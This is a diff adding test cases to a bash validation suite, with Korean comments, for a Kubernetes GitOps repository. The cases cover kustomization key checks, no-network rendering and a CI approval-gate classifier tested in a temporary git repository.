+  ap_case nested-fold-nonascii 1 "${AP_K7}$AP_VK configMapGenerator[0]: 키 '${AP_FOLDF}'에 ASCII 밖 글자" "${AP_NEG[@]}"
+  ap_case nested-dup 1 "${AP_K7}$AP_VK patches[0]: 키 'patch' 중복" "${AP_K7}$AP_VK patches[1]: 키 'Path' — 같은 항목의 'path'와 접으면 같은 필드다" \
+    "${AP_K7}$AP_VK patches[1]: 키 'Path' — $AP_NP" "${AP_NEG[@]}"
+  #   tests 범위 — 11.7 중첩 + 14.8 tests 키 집합(patches는 tests 허용 키 밖)
+  AP_TK='tests 허용 키 {apiVersion, kind, namespace, resources}'
+  ap_neg '11.7 FMT-kust-keys' '14.8 APP-remote'
+  ap_case nested-path-tests 1 "${AP_NONET[@]}" "${AP_K7}$AP_TESTS_K(문서 1) patches[0]: 키 'Path' — $AP_NP" \
+    "${AP_R}$AP_TESTS_K: 키 'patches' ∉ $AP_TK" "${AP_NEG[@]}"
+  # 14.9 모든 깊이 — 렌더를 바꾸지 않는 변이(철자 변형 · 기본값 options · 같은 디렉터리 파일 패치 · 기본값으로 채워지는 apiVersion)는 14.9만 걸린다
+  ap_neg '14.9 APP-kust-keys'
+  ap_case nested-image-newname-case 1 "${AP_K9}$AP_KDEV: images[0] 키 'NewName' ∉ {name, newName, digest}" "${AP_NEG[@]}"
+  ap_case app-kust-deep-extra 1 \
+    "${AP_K9}$AP_KDEV: patches[0].target 키 'Kind' ∉ {group, version, kind, name, namespace, labelSelector, annotationSelector}" "${AP_NEG[@]}"
+  ap_case app-patch-options 1 "${AP_K9}$AP_KDEV: patches[0] 키 'options' ∉ {target, patch}" "${AP_K9}$AP_KDEV: patches[0].options — 이 자리의 맵 금지" \
+    "${AP_NEG[@]}"
+  ap_case app-patch-path-local 1 "${AP_K9}$AP_KDEV: patches[2] 키 'path' ∉ {target, patch}" '+[PASS] 14.8 APP-remote' "${AP_NEG[@]}"
+  ap_case app-kust-base-missing 1 "${AP_K9}$AP_KBASE: 최상위 키 ≠ base 키 {apiVersion, kind, resources} — 빠짐 [apiVersion] 여분 []" "${AP_NEG[@]}"
+  #   newTag는 렌더의 image를 name:tag@digest로 바꾼다 — 14.6에도 걸린다(4a IMG-newTag는 기존 코드)
+  ap_neg '14.9 APP-kust-keys' '14.6 APP-image'
+  ap_case app-image-newtag 1 "${AP_K9}$AP_KDEV: images[0] 키 'newTag' ∉ {name, newName, digest}" \
+    "+[FAIL] 14.6 APP-image — $AP_DEV Deployment/jt-dev/identity-admin 컨테이너 web: image \"ghcr.io/joshua92y/identity-admin:v1@sha256:" "${AP_NEG[@]}"
+  # 14.8 tests 범위 키 집합(재검토 G1A-8 — 리뷰 A probe-tests-xfile: (a) transformer 설정 파일 · (b) helmCharts valuesFile · 키 여분) · configurations(G1A-10)
+  ap_neg '14.8 APP-remote'
+  ap_case tests-xform-file 1 "${AP_NONET[@]}" "${AP_R}$AP_TESTS_K: 키 'transformers' ∉ $AP_TK" "${AP_NEG[@]}"
+  ap_case tests-helm-values 1 "${AP_NONET[@]}" "${AP_R}$AP_TESTS_K: 키 'helmCharts' ∉ $AP_TK" "${AP_NEG[@]}"
+  ap_case tests-key-extra 1 "${AP_R}$AP_TESTS_K: 키 'nameSuffix' ∉ $AP_TK" "${AP_NEG[@]}"
+  ap_case remote-configurations 1 "${AP_NONET[@]}" "${AP_R}$AP_TESTS_K: configurations 'https://example.invalid/c.yaml' — 원격 ref 금지" \
+    "${AP_R}$AP_TESTS_K: configurations 'missing-config.yaml'(→ platform/policies/tests/missing-config.yaml) — 저장소 안의 실재 경로가 아니다" \
+    "${AP_R}$AP_TESTS_K: 키 'configurations' ∉ $AP_TK" "${AP_NEG[@]}"
+  #   (마지막 재검토 G1B-6) tests 범위 항목 = 같은 디렉터리의 파일 — ① 하위 디렉터리 ② 루트 tests/의 디렉터리 ③ 상위 디렉터리 파일
+  AP_TSR='tests 항목은 같은 디렉터리의 파일뿐'
+  ap_case tests-res-subdir 1 "${AP_R}$AP_TESTS_K: resources 'sub'(→ platform/policies/tests/sub) — $AP_TSR" "${AP_NEG[@]}"
+  ap_case tests-res-roottests 1 "${AP_R}$AP_TESTS_K: resources '../../../tests/x'(→ tests/x) — $AP_TSR" "${AP_NEG[@]}"
+  ap_case tests-res-parent 1 "${AP_R}$AP_TESTS_K: resources '../x.yaml'(→ platform/policies/x.yaml) — $AP_TSR" "${AP_NEG[@]}"
+  # 검사 1 「네트워크 없는 렌더」(재검토 G1B-4) — 심(apb_nonet_render_env)이 build마다 렌더 프로세스의 env를 FAIL 줄로 드러낸다. 앱 · tests(그 아래 포함)
+  #   = 차단 값 · platform/vault · platform/policies/testsx(경로 성분이 tests가 아니다) = 바깥의 감시 값 그대로. git 전송은 전부 금지다
+  #   (GIT_ALLOW_PROTOCOL=none — 마지막 재검토 G1B-5: file이면 file:// 로컬 저장소의 다른 ref가 렌더됐다)
+  AP_NB='+[FAIL] 1 KUST — kustomize build 실패: '
+  AP_NON='NONET-PROBE HTTPS_PROXY=http://127.0.0.1:9 https_proxy=http://127.0.0.1:9 HTTP_PROXY=http://127.0.0.1:9 http_proxy=http://127.0.0.1:9 ALL_PROXY=http://127.0.0.1:9 all_proxy=http://127.0.0.1:9 NO_PROXY= no_proxy= GIT_ALLOW_PROTOCOL=none GIT_SSH_COMMAND=false'
+  AP_NOFF='NONET-PROBE HTTPS_PROXY=http://127.0.0.1:1 https_proxy=http://127.0.0.1:1 HTTP_PROXY=http://127.0.0.1:1 http_proxy=http://127.0.0.1:1 ALL_PROXY=http://127.0.0.1:1 all_proxy=http://127.0.0.1:1 NO_PROXY=127.0.0.2 no_proxy=127.0.0.2 GIT_ALLOW_PROTOCOL=sentinel GIT_SSH_COMMAND=sentinel'
+  ap_neg
+  ap_case nonet-render-env 1 --env "PATH=$AP_NONET_BIN:$PATH" "${AP_NONET_SENT[@]}" \
+    "${AP_NB}apps/identity-admin/base — $AP_NON" "${AP_NB}apps/identity-admin/overlays/dev — $AP_NON" \
+    "${AP_NB}apps/identity-admin/overlays/prod — $AP_NON" "${AP_NB}platform/policies/tests — $AP_NON" \
+    "${AP_NB}platform/policies/tests/sub — $AP_NON" "${AP_NB}platform/policies/testsx — $AP_NOFF" "${AP_NB}platform/vault — $AP_NOFF" \
+    "${AP_NEG[@]}"
+else
+  for c in $AP_CASES; do
+    ap_case "$c" 1 '+[SKIP] 1 KUST — 도구 없음(kustomize)'
+  done
+fi
+
 # --- 작성자(봇) 경로 lint: positive 트리 + diff 입력 ---------------------------------
 run_case author-bot-ok "$FIX/positive" 0 \
   --env "PR_AUTHOR=jt-ci[bot]" --env "CHANGED_FILES=$DIGEST_FILE" --env "CHANGED_DIFF=$FIX/author/ok.diff" \
@@ -1914,6 +2802,112 @@ if any_selected fmt-symlink-index; then
   fi
 else
   skip_cases fmt-symlink-index
+fi
+
+# --- 승인 관문 classify(T075 D23 · 계약 §validate.yml 8 ① — 사용자 결정 UD-14와 그 보완) — 임시 git 저장소(tests/.tmp) ----------------------
+# .github/workflows/validate.yml의 job classify 스텝 "classify"의 인라인 스크립트(run:)를 yq로 꺼내 임시 저장소에서 그대로 돌린다(사본을 고치지 않는다 —
+# 워크플로가 실제로 실행하는 글자를 본다). 저장소: c0(README.md) — refs/remotes/origin/main = c0. 케이스마다 c0 위에 경로 하나를 더한 커밋을
+# 임시 인덱스로 만들어(작업 트리를 건드리지 않는다) HEAD_SHA로 넘기고, GITHUB_OUTPUT의 approval 값을 단언한다.
+#   need = 경로 성분 단위로 apps/<pod>/overlays/prod · apps/<pod>/base(자체와 그 아래) · clusters/oci-k3s/apps/<이름>-prod.yaml(.yml 포함) ·
+#          clusters/oci-k3s/projects · bootstrap/argocd(자체와 그 아래) 중 하나. 판정 실패(HEAD가 체크아웃에 없음 등)도 need(fail-closed)
+#   skip = 그 밖(dev overlay · <pod>-dev.yaml · platform-*.yaml · platform/** · tests/** · .github/** · 문서 · 성분이 다른 이름 projects-x · argocd-x · prod-x)
+CL_WF="$HERE/../.github/workflows/validate.yml"
+CL_REPO="$TMP/classify"
+CL_SCRIPT="$TMP/classify-run.sh"
+CL_C0=''; CL_HEAD=''; CL_OUT=''
+cl_build() { # if 조건 안에서 부르므로 set -e가 꺼진다 — 단계마다 실패를 확인한다
+  mkdir -p "$CL_REPO" || return 1
+  tg "$CL_REPO" init -q || return 1
+  printf 'base\n' > "$CL_REPO/README.md" || return 1
+  tg "$CL_REPO" add -A || return 1
+  tg "$CL_REPO" commit -q -m c0 || return 1
+  CL_C0=$(tg "$CL_REPO" rev-parse HEAD) || return 1
+  tg "$CL_REPO" update-ref refs/remotes/origin/main "$CL_C0" || return 1
+  yq '.jobs.classify.steps[] | select(.id == "classify") | .run' "$CL_WF" > "$CL_SCRIPT" || return 1
+  [[ -s $CL_SCRIPT ]]
+}
+cl_commit() { # <경로> → 전역 CL_HEAD: c0 위에 그 경로(내용 'x')를 더한 커밋 — 임시 인덱스(작업 트리 · HEAD를 건드리지 않는다)
+  local blob tree idx="$TMP/classify.index"
+  rm -f "$idx"
+  blob=$(printf 'x\n' | tg "$CL_REPO" hash-object -w --stdin) || return 1
+  GIT_INDEX_FILE=$idx tg "$CL_REPO" read-tree "$CL_C0" || return 1
+  GIT_INDEX_FILE=$idx tg "$CL_REPO" update-index --add --cacheinfo "100644,$blob,$1" || return 1
+  tree=$(GIT_INDEX_FILE=$idx tg "$CL_REPO" write-tree) || return 1
+  CL_HEAD=$(printf 'c\n' | tg "$CL_REPO" commit-tree "$tree" -p "$CL_C0") || return 1
+}
+cl_run() { # <HEAD_SHA> → 전역 CL_OUT(approval 값 — 출력이 없으면 빈 값). 스크립트의 종료 코드는 보지 않는다(판정은 출력 값이다)
+  local out="$TMP/classify.output" sum="$TMP/classify.summary"
+  : > "$out" && : > "$sum" || return 1
+  ( cd "$CL_REPO" && HEAD_SHA=$1 GITHUB_OUTPUT=$out GITHUB_STEP_SUMMARY=$sum RUNNER_TEMP=$TMP bash "$CL_SCRIPT" ) > /dev/null 2>&1 || true
+  CL_OUT=$(sed -n 's/^approval=//p' "$out" | tr -d '\r')
+}
+cl_case() { # <케이스> <기대 approval(need|skip)> <경로 | --bad-head> — 필터 밖이면 건너뜀으로 센다
+  local name=$1 want=$2 path=$3 head
+  selected "$name" || return 0
+  if [[ $path == --bad-head ]]; then
+    head=$(hex40 f)   # 형식은 맞지만 체크아웃에 없는 커밋 — 판정 실패 → need(fail-closed)
+  elif ! cl_commit "$path" 2>>"$TMP/classify.log"; then
+    N=$((N + 1)); NF=$((NF + 1)); FAILED+=("$name")
+    printf '[FAIL] %s\n       - 준비 실패: 커밋을 만들 수 없음(%s) — %s\n' "$name" "$path" "$(tr -d '\r' < "$TMP/classify.log" | tail -n 2 | tr '\n' ' ')"
+    return 0
+  else
+    head=$CL_HEAD
+  fi
+  cl_run "$head"
+  N=$((N + 1))
+  if [[ $CL_OUT == "$want" ]]; then
+    printf '[PASS] %s\n' "$name"
+  else
+    NF=$((NF + 1)); FAILED+=("$name")
+    printf '[FAIL] %s\n       - approval=%s ≠ 기대 %s(경로 %s)\n' "$name" "${CL_OUT:-(출력 없음)}" "$want" "$path"
+  fi
+}
+CL_CASES=(classify-need-prod-overlay classify-need-prod-overlay-deep classify-need-base classify-need-base-deep classify-need-prod-app
+  classify-need-prod-app-yml classify-need-projects-dev classify-need-projects-kustomization classify-need-bootstrap-argocd classify-need-bad-head
+  classify-skip-dev-overlay classify-skip-dev-app classify-skip-platform-app classify-skip-platform classify-skip-tests classify-skip-github
+  classify-skip-docs classify-skip-projects-x classify-skip-argocd-x classify-skip-prod-x classify-skip-base-x
+  classify-need-apps-kustomization-cap classify-need-apps-kustomization classify-need-apps-txt classify-need-apps-json classify-need-apps-subdir
+  classify-skip-apps-platform classify-skip-apps-dev classify-skip-apps-readme)
+if any_selected "${CL_CASES[@]}"; then
+  mkdir -p "$TMP"
+  if cl_build 2>"$TMP/classify.log"; then
+    cl_case classify-need-prod-overlay need apps/identity-admin/overlays/prod/kustomization.yaml
+    cl_case classify-need-prod-overlay-deep need apps/identity-admin/overlays/prod/sub/deep/x.yaml
+    cl_case classify-need-base need apps/identity-admin/base/configmap.yaml
+    cl_case classify-need-base-deep need apps/identity-admin/base/sub/x.yaml
+    cl_case classify-need-prod-app need clusters/oci-k3s/apps/identity-admin-prod.yaml
+    cl_case classify-need-prod-app-yml need clusters/oci-k3s/apps/blog-prod.yml
+    cl_case classify-need-projects-dev need clusters/oci-k3s/projects/dev.yaml
+    cl_case classify-need-projects-kustomization need clusters/oci-k3s/projects/kustomization.yaml
+    cl_case classify-need-bootstrap-argocd need bootstrap/argocd/argocd-cm.yaml
+    cl_case classify-need-bad-head need --bad-head
+    cl_case classify-skip-dev-overlay skip apps/identity-admin/overlays/dev/kustomization.yaml
+    cl_case classify-skip-dev-app skip clusters/oci-k3s/apps/identity-admin-dev.yaml
+    cl_case classify-skip-platform-app skip clusters/oci-k3s/apps/platform-vault.yaml
+    cl_case classify-skip-platform skip platform/vault/kustomization.yaml
+    cl_case classify-skip-tests skip tests/validate.sh
+    cl_case classify-skip-github skip .github/workflows/validate.yml
+    cl_case classify-skip-docs skip README.md
+    cl_case classify-skip-projects-x skip clusters/oci-k3s/projects-x/dev.yaml
+    cl_case classify-skip-argocd-x skip bootstrap/argocd-x/kustomization.yaml
+    cl_case classify-skip-prod-x skip apps/identity-admin/overlays/prod-x/kustomization.yaml
+    cl_case classify-skip-base-x skip apps/identity-admin/base-x/kustomization.yaml
+    # (T075 보정 2026-11-18 — GP-1 리뷰 G1B-2 · 계약 §validate.yml 8 ① 보완) clusters/oci-k3s/apps 아래에서 바로 아래의 *.yaml · *.yml도 README.md도
+    #   아닌 경로 = need(validate 11.6과 같은 집합 — kustomization 파일은 대소문자 무관 · *.yaml 이름이어도 need)
+    cl_case classify-need-apps-kustomization-cap need clusters/oci-k3s/apps/Kustomization
+    cl_case classify-need-apps-kustomization need clusters/oci-k3s/apps/kustomization.yaml
+    cl_case classify-need-apps-txt need clusters/oci-k3s/apps/evil.txt
+    cl_case classify-need-apps-json need clusters/oci-k3s/apps/x.json
+    cl_case classify-need-apps-subdir need clusters/oci-k3s/apps/sub/a.yaml
+    cl_case classify-skip-apps-platform skip clusters/oci-k3s/apps/platform-foo.yaml
+    cl_case classify-skip-apps-dev skip clusters/oci-k3s/apps/x-dev.yaml
+    cl_case classify-skip-apps-readme skip clusters/oci-k3s/apps/README.md
+  else
+    cl_why=$(tr -d '\r' < "$TMP/classify.log" | tail -n 3 | tr '\n' ' ')
+    for c in "${CL_CASES[@]}"; do fail_case "$c" "임시 git 저장소를 만들 수 없음 — $cl_why"; done
+  fi
+else
+  skip_cases "${CL_CASES[@]}"
 fi
 
 # --- 저장소 밖 root 거부(exit 2) — 실제 트리 검사는 여기서 하지 않는다(트리 상태에 따라 결과가 달라지므로) -----
